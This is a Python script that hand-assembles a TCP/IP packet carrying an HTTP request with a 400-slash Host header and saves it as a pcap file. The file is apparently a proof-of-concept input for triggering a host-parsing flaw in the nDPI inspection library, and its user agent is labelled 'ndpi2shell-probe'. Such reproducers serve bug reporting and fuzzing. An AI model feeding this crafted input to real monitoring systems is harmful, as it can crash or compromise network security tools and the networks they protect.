import struct, socket

def cksum(data):
    if len(data) & 1:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i+1]
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

host = b'/' * 400
payload = (b'GET / HTTP/1.1\r\nHost: ' + host + b'\r\n'
           b'User-Agent: ndpi2shell-probe\r\n'
           b'Accept: */*\r\n\r\n')

eth = b'\x00\x11\x22\x33\x44\x55' + b'\x66\x77\x88\x99\xaa\xbb' + b'\x08\x00'
src = socket.inet_aton('192.0.2.10')
dst = socket.inet_aton('198.51.100.20')
tcp = struct.pack('!HHIIBBHHH', 12345, 80, 1, 1, 5 << 4, 0x18, 65535, 0, 0)
pseudo = src + dst + struct.pack('!BBH', 0, 6, len(tcp) + len(payload))
tc = cksum(pseudo + tcp + payload)
tcp = tcp[:16] + struct.pack('!H', tc) + tcp[18:]
ip_len = 20 + len(tcp) + len(payload)
ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, ip_len, 1, 0, 64, 6, 0, src, dst)
ip = ip[:10] + struct.pack('!H', cksum(ip)) + ip[12:]
frame = eth + ip + tcp + payload

with open('/tmp/ndpi-longhost.pcap', 'wb') as f:
    f.write(struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
    f.write(struct.pack('<IIII', 1763899200, 0, len(frame), len(frame)))
    f.write(frame)
print('wrote', len(frame), 'bytes; host slashes =', len(host))
